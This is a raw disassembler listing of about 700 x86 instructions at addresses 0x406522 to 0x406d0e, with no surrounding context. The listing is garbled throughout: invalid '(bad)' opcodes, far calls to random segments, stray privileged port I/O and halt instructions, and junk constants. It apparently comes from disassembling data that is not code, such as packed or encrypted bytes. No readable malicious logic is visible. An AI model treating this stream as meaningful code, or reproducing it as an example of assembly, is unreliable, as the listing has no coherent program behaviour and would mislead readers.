  406522:	call   0xe12d:0x5c2a245b
  406529:	fwait
  40652a:	mov    dl,0xa7
  40652c:	dec    ecx
  40652d:	in     al,0xe1
  40652f:	sub    bh,dl
  406531:	xchg   ecx,eax
  406532:	pop    eax
  406533:	cmc    
  406534:	mov    dl,0xbf
  406536:	bnd jae 0x4064f1
  406539:	mov    ecx,0xb71ed82
  40653e:	jns    0x406591
  406540:	sub    DWORD PTR [eax+0x37b6e0f4],ebx
  406546:	push   0xffffffc0
  406548:	lea    ecx,[ecx-0x49605813]
  40654e:	xchg   BYTE PTR [eax+0x3],al
  406551:	mov    esi,0x8208a747
  406556:	sbb    esp,DWORD PTR ds:[eax+edi*4-0x8]
  40655b:	pop    ebx
  40655c:	mov    ch,0xf1
  40655e:	inc    ebp
  40655f:	inc    ebx
  406560:	cmp    BYTE PTR [ebx+eax*1+0x795d8ba7],dh
  406567:	(bad)  
  406568:	cmc    
  406569:	push   esp
  40656a:	adc    DWORD PTR [edi-0x5f8da74c],esp
  406570:	aam    0x4f
  406572:	call   0xf8c3:0xe88a09b7
  406579:	test   BYTE PTR [ecx-0x59],ch
  40657c:	enter  0x284b,0x89
  406580:	fcomi  st,st(2)
  406582:	sub    al,BYTE PTR [ecx]
  406584:	rcl    DWORD PTR [eax-0x2ed09266],0x9e
  40658b:	jl     0x406539
  40658d:	mov    eax,0x104a753
  406592:	(bad)  
  406593:	mov    esp,0xbbd1457d
  406598:	adc    bl,dh
  40659a:	cli    
  40659b:	rcr    dh,cl
  40659d:	mov    dl,0x9a
  40659f:	xor    eax,0x8c76aaef
  4065a4:	push   cs
  4065a5:	add    ch,bh
  4065a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065a8:	jecxz  0x40660a
  4065aa:	push   esp
  4065ab:	inc    ecx
  4065ac:	or     DWORD PTR [ecx],edx
  4065ae:	and    al,0xbf
  4065b0:	mov    eax,ds:0xb234893e
  4065b5:	loopne 0x406546
  4065b7:	mov    ss,WORD PTR [eax]
  4065b9:	cmp    DWORD PTR cs:[edi-0x19d9eb7d],esp
  4065c0:	pop    ds
  4065c1:	fbstp  TBYTE PTR [edi+0x78]
  4065c4:	mov    dl,0x86
  4065c6:	add    ecx,edi
  4065c8:	(bad)  
  4065c9:	outs   dx,BYTE PTR ds:[esi]
  4065ca:	push   cs
  4065cb:	ja     0x406637
  4065cd:	or     edx,DWORD PTR [edx]
  4065cf:	add    al,0xd3
  4065d1:	lock fwait
  4065d3:	push   ebx
  4065d4:	adc    eax,0xa3c59d5d
  4065d9:	inc    eax
  4065da:	shl    BYTE PTR [edx],cl
  4065dc:	mov    eax,ds:0x390764ba
  4065e1:	stc    
  4065e2:	add    esp,DWORD PTR [edi+0x6bc6d510]
  4065e8:	xlat   BYTE PTR ds:[ebx]
  4065e9:	addr16 mov bh,0x1e
  4065ec:	(bad)  
  4065ed:	fld    QWORD PTR [edi+eiz*1-0x32060f18]
  4065f4:	popf   
  4065f5:	cmp    BYTE PTR [ecx+ebx*4+0x421a1033],0xe
  4065fd:	not    DWORD PTR [ecx-0x50]
  406600:	mov    edx,0x83f093dd
  406605:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406607:	daa    
  406608:	push   es
  406609:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40660a:	dec    ecx
  40660b:	test   al,0xc9
  40660d:	or     eax,DWORD PTR [esi-0x5608ce43]
  406613:	adc    al,0xb9
  406615:	outs   dx,BYTE PTR ds:[esi]
  406616:	cli    
  406617:	clc    
  406618:	nop
  406619:	iret   
  40661a:	sbb    esp,DWORD PTR [ebp+ebp*1-0xe6e30f5]
  406621:	xchg   DWORD PTR [ecx-0x65bae65d],edi
  406627:	push   edi
  406628:	jge    0x40667c
  40662a:	dec    ebp
  40662b:	mov    bh,0xd4
  40662d:	dec    ebx
  40662e:	std    
  40662f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406630:	xchg   edi,eax
  406631:	pop    edx
  406632:	in     al,dx
  406633:	push   ebp
  406634:	ss pop ecx
  406636:	adc    eax,DWORD PTR [ebp-0x4e]
  406639:	hlt    
  40663a:	sub    DWORD PTR [esi+0x73],eax
  40663d:	sbb    edi,esi
  40663f:	xchg   ecx,eax
  406640:	fisttp QWORD PTR [edx]
  406642:	jo     0x4066c0
  406644:	outs   dx,BYTE PTR ds:[esi]
  406645:	jne    0x406678
  406647:	sbb    BYTE PTR [ebx],ch
  406649:	sti    
  40664a:	fbstp  TBYTE PTR ds:0xf467cdb5
  406650:	out    dx,eax
  406651:	xor    ebx,ebx
  406653:	gs cs push es
  406656:	dec    esi
  406657:	sub    eax,0xfef70b97
  40665c:	mov    DWORD PTR ds:0xfc8135de,edi
  406662:	ret    0xa785
  406665:	or     esi,ebp
  406667:	ret    0x2d56
  40666a:	cmp    ch,BYTE PTR [ebx-0x585e1e37]
  406670:	jo     0x40664f
  406672:	dec    edx
  406673:	out    0x32,eax
  406675:	jg     0x406622
  406677:	into   
  406678:	rcl    bl,0x84
  40667b:	jnp    0x406693
  40667d:	(bad)  
  40667e:	call   0xf161:0x1e9e4ce0
  406685:	or     ebp,DWORD PTR [esi+0x17b5170]
  40668b:	push   ss
  40668c:	mov    WORD PTR [eax+0x5504d09a],?
  406692:	mov    gs,WORD PTR [eax-0x594c492c]
  406698:	scas   al,BYTE PTR es:[edi]
  406699:	mov    ch,0xad
  40669b:	(bad)  
  40669c:	jns    0x4066f4
  40669e:	fimul  WORD PTR [edi+0x1d]
  4066a1:	aas    
  4066a2:	xchg   DWORD PTR [edi],ecx
  4066a4:	and    al,BYTE PTR [ebx+0x6b125f1a]
  4066aa:	(bad)  
  4066ab:	icebp  
  4066ac:	jae    0x4066b9
  4066ae:	add    BYTE PTR [ebx+0x6d1f9744],ch
  4066b4:	xlat   BYTE PTR ds:[ebx]
  4066b5:	rcr    BYTE PTR [edx+0x21dde187],1
  4066bb:	mov    ebx,0xb010e547
  4066c0:	mov    ch,0x22
  4066c2:	sub    eax,0xdec54a7
  4066c7:	stc    
  4066c8:	add    DWORD PTR [ebp-0x66],ecx
  4066cb:	fsubrp st(3),st
  4066cd:	rcl    ecx,1
  4066cf:	and    eax,0xa61a0d6b
  4066d4:	clc    
  4066d5:	and    eax,0xf21790f7
  4066da:	mov    ebp,0x7eabf477
  4066df:	add    eax,0xa75a9d8b
  4066e4:	(bad)  
  4066e5:	call   0xed3b6736
  4066ea:	in     al,dx
  4066eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066ec:	in     eax,0x4
  4066ee:	aaa    
  4066ef:	push   ecx
  4066f0:	dec    edx
  4066f1:	or     DWORD PTR [ebx+ebx*2+0x2781b1b1],edi
  4066f8:	jb     0x4066bd
  4066fa:	loopne 0x40675b
  4066fc:	cwde   
  4066fd:	loope  0x406748
  4066ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406700:	pop    ss
  406701:	stos   DWORD PTR es:[edi],eax
  406702:	pop    esi
  406703:	cmc    
  406704:	je     0x40668f
  406706:	mov    ebp,DWORD PTR [eax]
  406708:	mov    dl,0x73
  40670a:	outs   dx,DWORD PTR ds:[esi]
  40670b:	stc    
  40670c:	aas    
  40670d:	inc    edi
  40670e:	dec    eax
  40670f:	test   al,0x1c
  406711:	add    BYTE PTR [ebx+0x1a0c1677],dl
  406717:	test   BYTE PTR [ebp-0x4d947410],ch
  40671d:	add    eax,0x13704536
  406722:	lods   al,BYTE PTR ds:[esi]
  406723:	push   cs
  406724:	xchg   BYTE PTR [ecx+0x3c],bh
  406727:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406728:	add    eax,0x792b302b
  40672d:	push   es
  40672e:	pop    esi
  40672f:	inc    ecx
  406730:	mov    dl,0xa0
  406732:	adc    DWORD PTR [eax+0x50],ecx
  406735:	or     bh,ah
  406737:	sub    cl,BYTE PTR [ecx-0xd9e58f8]
  40673d:	outs   dx,BYTE PTR ds:[esi]
  40673e:	mov    dh,BYTE PTR [edi+0x4d]
  406741:	sbb    esp,DWORD PTR [edx-0x652bfd5e]
  406747:	dec    ebx
  406748:	and    DWORD PTR [edi+0x63a6addb],ebp
  40674e:	sar    bl,cl
  406750:	div    BYTE PTR [edx]
  406752:	call   0x61e:0xd3aba1b5
  406759:	in     eax,0x9a
  40675b:	arpl   WORD PTR [edi],di
  40675d:	call   0xa707:0xe3a5f110
  406764:	cmp    bh,BYTE PTR [edi]
  406766:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406767:	(bad)  
  406768:	fidiv  DWORD PTR [edi+0x44]
  40676b:	nop
  40676c:	mov    dl,0xcc
  40676e:	jl     0x4066f2
  406770:	iret   
  406771:	mov    bh,BYTE PTR [ebx]
  406773:	dec    eax
  406774:	push   ds
  406775:	or     esp,DWORD PTR [edx+ecx*8+0x6b]
  406779:	pop    ss
  40677a:	dec    esp
  40677b:	jl     0x40673a
  40677d:	and    al,0x99
  40677f:	fucom  st(5)
  406781:	iret   
  406782:	fld    DWORD PTR [ecx]
  406784:	sbb    eax,0x1152c88b
  406789:	xor    al,0x45
  40678b:	adc    BYTE PTR [edx+0xe],cl
  40678e:	mov    DWORD PTR [ebx],edi
  406790:	sbb    edx,DWORD PTR [eax+0x34]
  406793:	cmp    DWORD PTR [bp+si-0x11],edi
  406797:	sbb    esi,DWORD PTR [edx-0x1271b533]
  40679d:	out    0xd0,al
  40679f:	int    0xa0
  4067a1:	or     edi,DWORD PTR [edi+edx*2-0x5c5940dc]
  4067a8:	lock xor eax,0x25e2989a
  4067ae:	test   eax,0x4b8667b8
  4067b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067b4:	sbb    eax,0x14689bc
  4067b9:	lods   al,BYTE PTR ds:[esi]
  4067ba:	(bad)  
  4067bb:	les    esi,FWORD PTR [edx-0x620b7d21]
  4067c1:	jge    0x406781
  4067c3:	sbb    DWORD PTR [ecx+0x39e600b],ebx
  4067c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067ca:	std    
  4067cb:	and    al,0x7f
  4067cd:	in     eax,dx
  4067ce:	call   0xcacb:0x11921efc
  4067d5:	js     0x406775
  4067d7:	mov    ebx,0x27d3fe2c
  4067dc:	push   0xffffff9a
  4067de:	jne    0x40682e
  4067e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067e1:	sti    
  4067e2:	jo     0x40685a
  4067e4:	mov    dl,0x66
  4067e6:	jecxz  0x4067e0
  4067e8:	cmp    eax,edx
  4067ea:	fdiv   DWORD PTR [ecx-0x3a1df4b9]
  4067f0:	pop    esi
  4067f1:	add    dh,BYTE PTR [eax+0x48]
  4067f4:	and    eax,0xbcac9af4
  4067f9:	adc    dl,BYTE PTR [edx-0x35597f35]
  4067ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406801:	sahf   
  406802:	push   ecx
  406803:	pop    di
  406805:	dec    edx
  406806:	push   0xe782b3d5
  40680b:	fnstcw WORD PTR [esp+ebp*1]
  40680e:	inc    edi
  40680f:	xchg   edx,eax
  406810:	cmp    BYTE PTR [edi+0x34],0xa7
  406814:	stc    
  406815:	jmp    0xd62bb137
  40681a:	int3   
  40681b:	enter  0x61b2,0xe2
  40681f:	mov    bl,0x37
  406821:	sbb    DWORD PTR [ebx+0x4b79577d],ecx
  406827:	test   al,0x2
  406829:	and    al,0xfa
  40682b:	call   0xf3ea:0xd885c432
  406832:	mov    ds:0xd78bf68e,al
  406837:	pop    eax
  406838:	inc    ecx
  406839:	outs   dx,DWORD PTR ds:[esi]
  40683a:	jge    0x406841
  40683c:	imul   eax,DWORD PTR [esi+esi*4],0x41
  406840:	sbb    al,0x9a
  406842:	xor    esi,edi
  406844:	xor    ah,BYTE PTR [esi]
  406846:	xor    BYTE PTR [ebx+0x669d218f],0x22
  40684d:	and    BYTE PTR [ecx],dl
  40684f:	jg     0x4068c3
  406851:	into   
  406852:	es push ebx
  406854:	or     al,0xb
  406856:	cld    
  406857:	dec    ebx
  406858:	push   ss
  406859:	jae    0x40680a
  40685b:	dec    eax
  40685c:	mov    ecx,0x11d486b3
  406861:	dec    edi
  406862:	adc    al,0x85
  406864:	jns    0x406870
  406866:	sbb    DWORD PTR [eax+0x66dabf5a],0x9e040a55
  406870:	popf   
  406871:	ds sbb dh,ch
  406874:	xor    esi,esp
  406876:	push   ecx
  406877:	ror    BYTE PTR [edi+0x13fd9a5d],cl
  40687d:	sbb    esp,ebp
  40687f:	sub    ah,BYTE PTR [eax]
  406881:	loopne 0x40688c
  406883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406884:	imul   ecx,DWORD PTR [ebp-0x506ac690],0xeab3bcc1
  40688e:	jb     0x40687d
  406890:	call   0x692845de
  406895:	retf   0x8b46
  406898:	ret    0xccb2
  40689b:	mov    cl,0x86
  40689d:	jb     0x4068a3
  40689f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068a0:	test   bh,0xad
  4068a3:	(bad)  
  4068a4:	mov    al,0x7a
  4068a6:	xchg   ebp,eax
  4068a7:	lods   al,BYTE PTR ds:[esi]
  4068a8:	xchg   ebx,eax
  4068a9:	jmp    0x4068db
  4068ab:	cmp    bl,dh
  4068ad:	or     ah,BYTE PTR [eax+0x7a41b6a2]
  4068b3:	jmp    0x8ab5:0x60d30bcd
  4068ba:	out    dx,al
  4068bb:	add    al,0xc3
  4068bd:	sub    BYTE PTR [edx+0x299f5b6],bl
  4068c3:	or     edx,edx
  4068c5:	or     BYTE PTR [edi+eiz*4],cl
  4068c8:	push   ss
  4068c9:	mov    dh,0x62
  4068cb:	or     eax,0x416781e2
  4068d0:	mov    dl,0xfe
  4068d2:	push   eax
  4068d3:	adc    DWORD PTR [ecx+0x59],edi
  4068d6:	or     BYTE PTR [esp+edx*8-0x4c4715f5],cl
  4068dd:	adc    ebx,DWORD PTR [ecx-0x667006a2]
  4068e3:	dec    edx
  4068e4:	(bad)  
  4068e6:	mov    BYTE PTR [ebx+0x1d],bh
  4068e9:	mov    ebx,0x2c01c37
  4068ee:	and    eax,0x9ad5e044
  4068f3:	sbb    DWORD PTR [ecx],ebp
  4068f5:	and    al,0x92
  4068f7:	stos   DWORD PTR es:[edi],eax
  4068f8:	mov    dl,0x9d
  4068fa:	jne    0x406919
  4068fc:	scas   eax,DWORD PTR es:[edi]
  4068fd:	mov    edx,0xb0e8947
  406902:	dec    BYTE PTR [ebp+0x1262315f]
  406908:	out    dx,al
  406909:	xchg   BYTE PTR [edx-0xfbd3d5e],bl
  40690f:	push   edi
  406910:	jmp    0x2bda:0xcabaca1e
  406917:	jno    0x406991
  406919:	or     ebx,DWORD PTR [esi+edi*4+0x54a595a3]
  406920:	out    dx,al
  406921:	mul    DWORD PTR [ebp+0x219b14a4]
  406927:	inc    ebp
  406928:	or     al,0xd3
  40692a:	gs sti 
  40692c:	or     BYTE PTR [eax],0x9c
  40692f:	mov    ebp,0x47a5cdea
  406934:	adc    eax,0x1b8754fb
  406939:	xor    DWORD PTR es:[esi+ebp*2+0x73],0xa4e10f1c
  406942:	lock mov ds:0xc5c41e8d,eax
  406948:	sub    al,0xcb
  40694a:	test   eax,0x9acb0442
  40694f:	dec    ecx
  406950:	xchg   edi,eax
  406951:	sti    
  406952:	out    dx,al
  406953:	stos   BYTE PTR es:[edi],al
  406954:	stos   DWORD PTR es:[edi],eax
  406955:	nop
  406956:	hlt    
  406957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406958:	imul   edx,DWORD PTR [ecx+0x37203b56],0xb0b2ae88
  406962:	jmp    0xded3c788
  406967:	mov    al,0x63
  406969:	or     al,0xea
  40696b:	adc    eax,0x7cf0f385
  406971:	dec    ebx
  406972:	fsub   QWORD PTR [esi]
  406974:	fisttp QWORD PTR [ecx+0xbe582d2]
  40697a:	fcom   DWORD PTR fs:[eax-0x5f]
  40697e:	xchg   ecx,eax
  40697f:	in     eax,0x3d
  406981:	or     ebx,ebp
  406983:	jmp    DWORD PTR [ebx+0x2f]
  406986:	or     BYTE PTR [edx],0x6a
  406989:	and    ah,BYTE PTR [esi-0x68]
  40698c:	mov    dl,0x1d
  40698e:	lahf   
  40698f:	jmp    0xd5c781db
  406994:	and    DWORD PTR [eax],esi
  406996:	test   DWORD PTR [edi],esp
  406998:	mov    dh,0xf0
  40699a:	jg     0x40698c
  40699c:	retf   
  40699d:	mov    eax,DWORD PTR [ecx+0x5b]
  4069a0:	push   eax
  4069a1:	outs   dx,BYTE PTR ds:[esi]
  4069a2:	call   0x51f9:0x152c0c60
  4069a9:	mov    cl,0x0
  4069ab:	push   es
  4069ac:	push   cs
  4069ad:	add    edi,edx
  4069af:	pushf  
  4069b0:	ror    DWORD PTR [ebx],cl
  4069b2:	jb     0x406a1d
  4069b4:	pop    edi
  4069b5:	adc    al,0xd4
  4069b7:	and    ah,bl
  4069b9:	mov    dh,0x9a
  4069bb:	xchg   esp,eax
  4069bc:	(bad)  
  4069be:	imul   ebx,DWORD PTR [ebx-0x66f5de7e],0x119a63a7
  4069c8:	mov    DWORD PTR [eax+esi*2],edi
  4069cb:	pop    es
  4069cc:	jmp    0x406a14
  4069ce:	call   0x243e:0xea857bdd
  4069d5:	or     dl,ah
  4069d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069d8:	pop    edx
  4069d9:	pop    ds
  4069da:	sbb    al,0x8f
  4069dc:	jp     0x406a4d
  4069de:	xchg   esp,eax
  4069df:	cmp    al,0xb2
  4069e1:	mov    esp,DWORD PTR [ebx+eax*2-0x1]
  4069e5:	inc    esp
  4069e6:	adc    BYTE PTR [esi-0x7c9cfafe],cl
  4069ec:	hlt    
  4069ed:	pop    esi
  4069ee:	call   0x12b5:0x79e4fa87
  4069f5:	in     al,0x89
  4069f7:	lahf   
  4069f8:	mov    dl,0x2a
  4069fa:	push   ecx
  4069fb:	mov    ebp,0x75f89d90
  406a00:	fwait
  406a01:	or     cl,BYTE PTR [edi]
  406a03:	fscale 
  406a05:	stc    
  406a06:	retf   0x594
  406a09:	out    dx,eax
  406a0a:	loope  0x4069ef
  406a0c:	mov    cl,0xc
  406a0e:	fsubr  DWORD PTR [edx+0x49]
  406a11:	sub    al,0x8c
  406a13:	dec    edi
  406a14:	jns    0x4069d8
  406a16:	std    
  406a17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a18:	pop    ebx
  406a19:	fdivr  st,st(4)
  406a1b:	sub    eax,0xd0f2dfce
  406a20:	mov    ch,0x11
  406a22:	xor    DWORD PTR ds:0x5aeb1830,edi
  406a28:	cmp    edx,DWORD PTR [edi-0x26]
  406a2b:	sbb    al,0x8
  406a2d:	retf   
  406a2e:	sub    DWORD PTR [edi+0x6e888b3],esp
  406a34:	fdivr  DWORD PTR [edx-0x62]
  406a37:	bound  esi,QWORD PTR [edx-0x7674fc46]
  406a3d:	fst    QWORD PTR [edi-0x25]
  406a40:	sbb    DWORD PTR [ebx],ecx
  406a42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a43:	out    dx,eax
  406a44:	jge    0x4069cb
  406a46:	stos   DWORD PTR es:[edi],eax
  406a47:	jecxz  0x406ab1
  406a49:	mov    esi,0xd93fa49a
  406a4e:	idiv   BYTE PTR [eax-0x583653c9]
  406a54:	dec    edi
  406a55:	pop    esp
  406a56:	dec    ebp
  406a57:	inc    BYTE PTR [ebp-0x4da78022]
  406a5d:	xor    eax,0x6bd30c3f
  406a62:	repnz enter 0x24c6,0x47
  406a67:	xor    eax,0x800275d1
  406a6c:	fsubrp st(6),st
  406a6e:	xchg   esi,eax
  406a6f:	mov    ecx,ebx
  406a71:	stc    
  406a72:	xlat   BYTE PTR ds:[ebx]
  406a73:	xchg   ecx,eax
  406a74:	add    BYTE PTR [ebx],cl
  406a76:	sbb    BYTE PTR [ebx],dh
  406a78:	iret   
  406a79:	mov    ds:0x9bdb34c8,al
  406a7e:	call   0xb9e3:0xd57a2adb
  406a85:	mov    BYTE PTR [edi+eiz*4],cl
  406a88:	dec    eax
  406a89:	repnz and BYTE PTR [esp+edi*8-0x19],bh
  406a8e:	mov    es,WORD PTR [esi-0x12]
  406a91:	aam    0x67
  406a93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a94:	fwait
  406a95:	hlt    
  406a96:	push   ecx
  406a97:	stc    
  406a98:	mov    ds:0xf9bbe6b8,eax
  406a9d:	es adc al,0x67
  406aa0:	sar    BYTE PTR [edx],0xe3
  406aa3:	cmp    ch,ch
  406aa5:	xchg   BYTE PTR [ebp-0x40b3af56],dl
  406aab:	out    0x5e,eax
  406aad:	add    BYTE PTR [esp+esi*2+0x154b2db3],ch
  406ab4:	es push cs
  406ab6:	xchg   BYTE PTR [ebx],ch
  406ab8:	out    dx,eax
  406ab9:	or     al,0x57
  406abb:	stc    
  406abc:	jp     0x406a46
  406abe:	sbb    dl,BYTE PTR [esi+0xa]
  406ac1:	fst    DWORD PTR [bx+di-0x4b]
  406ac5:	cmp    DWORD PTR [esi+esi*4-0x59],esi
  406ac9:	scas   eax,DWORD PTR es:[edi]
  406aca:	jmp    0xe4a7:0x1f49682c
  406ad1:	(bad)  
  406ad2:	and    al,0xf9
  406ad4:	test   BYTE PTR [eax+0x20],bh
  406ad7:	in     al,dx
  406ad8:	mov    dl,0xc
  406ada:	mov    WORD PTR [ecx],ss
  406adc:	and    eax,0xacd8eb18
  406ae1:	fwait
  406ae2:	daa    
  406ae3:	cwde   
  406ae4:	mov    al,0x86
  406ae6:	call   0xb742:0x39366447
  406aed:	pop    esp
  406aee:	lahf   
  406aef:	and    edx,ecx
  406af1:	push   0xffffff9b
  406af3:	rdtsc  
  406af5:	in     al,dx
  406af6:	sahf   
  406af7:	or     al,0x95
  406af9:	ret    
  406afa:	and    al,0x14
  406afc:	cwde   
  406afd:	or     ebp,DWORD PTR [edi-0x724c70f]
  406b03:	adc    dl,BYTE PTR [ecx+0x58b98c1]
  406b09:	ficom  WORD PTR [edi-0x39]
  406b0c:	jnp    0x406b79
  406b0e:	push   esi
  406b0f:	or     dl,BYTE PTR [esi]
  406b11:	or     ebx,DWORD PTR [esi]
  406b13:	(bad)  
  406b14:	jle    0x406b00
  406b16:	add    DWORD PTR ds:0xd887d0da,ecx
  406b1c:	cmp    DWORD PTR [esi],esi
  406b1e:	call   0xfab6:0xcfd542b8
  406b25:	or     ebx,ebp
  406b27:	ror    DWORD PTR [ebp-0x57],0x74
  406b2b:	xchg   ecx,eax
  406b2c:	sbb    eax,0x65529aa3
  406b31:	or     eax,0x86f681cc
  406b36:	out    dx,eax
  406b37:	(bad)  
  406b38:	aad    0xb
  406b3a:	adc    BYTE PTR [esi-0x7be39f1e],ch
  406b40:	mov    bh,BYTE PTR [edi-0x66]
  406b43:	imul   ecx,ebx,0x4e
  406b46:	xchg   esp,eax
  406b47:	retf   0xe122
  406b4a:	or     DWORD PTR [edi-0x39fe1423],esp
  406b50:	cli    
  406b51:	lods   eax,DWORD PTR ds:[esi]
  406b52:	cli    
  406b53:	mov    ah,0x8e
  406b55:	or     BYTE PTR [edx+0x27],al
  406b58:	jle    0x406b40
  406b5a:	jno    0x406b2c
  406b5c:	push   DWORD PTR [eax]
  406b5e:	cld    
  406b5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b60:	in     eax,0x73
  406b62:	nop
  406b63:	mov    eax,0x1ee31939
  406b68:	mov    cl,0x18
  406b6a:	or     DWORD PTR [ebx],esi
  406b6c:	sbb    al,0x9b
  406b6e:	and    eax,0x4ebd150e
  406b73:	adc    al,0xb8
  406b75:	or     ebx,DWORD PTR [ebx]
  406b77:	or     al,0xec
  406b79:	xchg   esi,eax
  406b7a:	add    esp,DWORD PTR [ecx]
  406b7c:	ret    
  406b7d:	int3   
  406b7e:	call   0x399a:0x398866b9
  406b85:	bound  ecx,QWORD PTR [ecx-0x5c]
  406b88:	and    ebp,DWORD PTR [esi+0x33]
  406b8b:	sub    ebx,DWORD PTR [edx-0x72578df7]
  406b91:	inc    edx
  406b92:	call   0x20d5:0x27b95b6e
  406b99:	adc    esi,DWORD PTR [ebp-0x55]
  406b9c:	mov    bh,0xf1
  406b9e:	stos   BYTE PTR es:[edi],al
  406b9f:	nop
  406ba0:	int3   
  406ba1:	ins    BYTE PTR es:[edi],dx
  406ba2:	xchg   ebp,eax
  406ba3:	cli    
  406ba4:	sub    cl,BYTE PTR [eax-0x573818a4]
  406baa:	sbb    DWORD PTR [edi+0x15e905af],0x4e
  406bb1:	mov    esi,0x8035edfa
  406bb6:	xor    BYTE PTR [edx-0x397df24e],ch
  406bbc:	shl    DWORD PTR [bx+di+0x1f],cl
  406bc0:	mov    DWORD PTR [ebx+eax*1],esi
  406bc3:	add    esi,DWORD PTR [edx]
  406bc5:	sub    DWORD PTR [ecx-0x4441092f],edi
  406bcb:	push   eax
  406bcc:	mov    bl,0xc9
  406bce:	pop    ebp
  406bcf:	neg    BYTE PTR [edi]
  406bd1:	mov    eax,DWORD PTR [ebx-0x1cf52d36]
  406bd7:	mov    edx,0xe2bde87a
  406bdc:	pop    ss
  406bdd:	daa    
  406bde:	mov    ch,0x67
  406be0:	lods   al,BYTE PTR ds:[esi]
  406be1:	sti    
  406be2:	imul   ebx,DWORD PTR [ecx+0x1b84afb1],0x1cf0588f
  406bec:	out    0xa3,eax
  406bee:	ins    BYTE PTR es:[edi],dx
  406bef:	xchg   dh,ah
  406bf1:	add    eax,0x99d3e945
  406bf6:	jp     0x406c4f
  406bf8:	cmp    eax,0xbc1560b1
  406bfd:	dec    ebx
  406bfe:	rcr    DWORD PTR [edx],cl
  406c00:	std    
  406c01:	retf   
  406c02:	lds    edi,FWORD PTR [esi+0x52]
  406c05:	fisub  DWORD PTR [edi+eiz*4-0x155435]
  406c0c:	enter  0xdf5d,0xe3
  406c10:	mov    dl,0xb0
  406c12:	pop    ebx
  406c13:	or     eax,0x776d5435
  406c18:	dec    edi
  406c19:	or     edx,DWORD PTR [eax+esi*1-0x3127752d]
  406c20:	int3   
  406c21:	push   edi
  406c22:	outs   dx,BYTE PTR ds:[esi]
  406c23:	sar    BYTE PTR [ebp+0x72afdb52],1
  406c29:	or     ecx,esi
  406c2b:	sbb    al,0xe9
  406c2d:	jnp    0x406c48
  406c2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c30:	inc    edi
  406c31:	lods   eax,DWORD PTR ds:[esi]
  406c32:	xchg   BYTE PTR [ebx],dl
  406c34:	js     0x406c9d
  406c36:	pop    ds
  406c37:	mov    edx,0xa814b6b2
  406c3c:	cmp    eax,0x953483fb
  406c41:	or     dl,al
  406c43:	pop    esi
  406c44:	fs jbe 0x406cb9
  406c47:	ficom  WORD PTR [edx+0x63]
  406c4a:	mov    ah,0x8b
  406c4c:	mov    bh,0xe8
  406c4e:	jp     0x406c5c
  406c50:	add    dh,0x9a
  406c53:	pop    ebx
  406c54:	or     esp,DWORD PTR [edx-0x61]
  406c57:	shl    BYTE PTR [esi],cl
  406c59:	adc    eax,0x31c50fb1
  406c5e:	sbb    al,BYTE PTR [eax-0x25586594]
  406c64:	push   cs
  406c65:	adc    DWORD PTR [ebx-0x64c72645],ebx
  406c6b:	pop    es
  406c6c:	(bad)
  406c71:	or     esi,esp
  406c73:	pop    esp
  406c74:	jmp    0x406c9e
  406c76:	outs   dx,BYTE PTR ds:[esi]
  406c77:	scas   al,BYTE PTR es:[edi]
  406c78:	or     eax,0x11799a22
  406c7d:	xchg   ebp,eax
  406c7e:	cmp    BYTE PTR [ecx-0x58e3c999],al
  406c84:	mov    cl,0xd4
  406c86:	sbb    eax,0x3262f55d
  406c8b:	int    0xa5
  406c8d:	fcom   DWORD PTR [edx]
  406c8f:	push   eax
  406c90:	lods   eax,DWORD PTR ds:[esi]
  406c91:	mov    WORD PTR [ebp+0x7a113ccf],ds
  406c97:	sbb    bh,BYTE PTR [ebx+0x15a76f90]
  406c9d:	out    dx,al
  406c9e:	mov    bl,BYTE PTR [esi+0x79c09a9a]
  406ca4:	mov    dl,0x6e
  406ca6:	jl     0x406ceb
  406ca8:	loopne 0x406c84
  406caa:	stos   BYTE PTR es:[edi],al
  406cab:	loop   0x406d13
  406cad:	or     eax,edi
  406caf:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  406cb1:	xor    BYTE PTR [eax-0x6596e330],bh
  406cb7:	(bad)  
  406cb8:	mov    eax,ds:0x2d54abe0
  406cbd:	push   cs
  406cbe:	sub    al,0xa7
  406cc0:	sbb    esi,DWORD PTR [edi]
  406cc2:	mov    ebp,0x16c7c9ec
  406cc7:	mov    esi,0x6598cdb2
  406ccc:	push   es
  406ccd:	mov    bl,dh
  406ccf:	fisttp DWORD PTR [ebx+ecx*1+0x2fa905b5]
  406cd6:	bound  edi,QWORD PTR [eax-0x7a14c203]
  406cdc:	and    bh,BYTE PTR [esi-0x66]
  406cdf:	mov    ds:0x203d0d31,eax
  406ce4:	aam    0x76
  406ce6:	(bad)  [esi-0x49db2256]
  406cec:	jno    0x406cea
  406cee:	mov    bl,0x27
  406cf0:	js     0x406ce9
  406cf2:	cmp    al,0x22
  406cf4:	jns    0x406c98
  406cf6:	retf   
  406cf7:	mov    ebx,0xa7db6596
  406cfc:	add    DWORD PTR [edx+esi*4],edi
  406cff:	inc    esi
  406d00:	mov    ecx,0x5fc89a72
  406d05:	xchg   esi,eax
  406d06:	aad    0x2f
  406d08:	rol    BYTE PTR [edx+0x2a2a720],cl
  406d0e:	cmp    DWORD PTR [edi],eax
